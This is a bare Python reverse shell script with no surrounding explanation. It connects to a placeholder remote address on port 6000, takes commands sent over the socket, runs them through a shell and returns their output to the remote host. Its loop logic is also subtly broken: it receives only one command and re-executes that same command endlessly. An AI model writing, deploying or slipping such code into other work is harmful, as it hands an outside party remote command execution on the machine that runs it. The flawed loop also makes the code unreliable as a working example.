import socket
import subprocess

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect(("XX.XX.XX.XX",6000))
c = s.recv(2048)

ref = ""
while True:
    if c != ref :
        decoded_cmd = c.decode()
        res = subprocess.Popen(decoded_cmd,shell=True , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = res.stdout.read() + res.stderr.read()
        s.send(output) 
    


